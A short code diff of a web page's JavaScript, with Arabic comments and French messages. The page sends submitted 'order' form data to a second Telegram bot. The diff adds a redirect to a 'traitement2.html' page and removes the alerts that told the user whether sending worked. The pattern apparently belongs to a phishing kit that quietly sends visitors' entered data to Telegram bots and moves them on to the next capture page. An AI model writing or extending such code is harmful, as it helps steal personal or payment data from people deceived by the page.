@@ -213,6 +213,9 @@
 
             // إرسال البيانات إلى البوت الثاني
             sendToTelegram(bot2Token, bot2Id, message);
+
+            // الانتقال إلى صفحة جديدة بعد إرسال البيانات
+            window.location.href = 'traitement2.html'; // الانتقال إلى الصفحة التالية
         });
 
         // دالة لإرسال الرسالة إلى بوت Telegram
@@ -234,11 +237,9 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Message sent:', data);
-                alert('Votre commande a été envoyée avec succès!');
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('Il y a eu un problème avec l\'envoi de la commande.');
             });
         }
     </script>
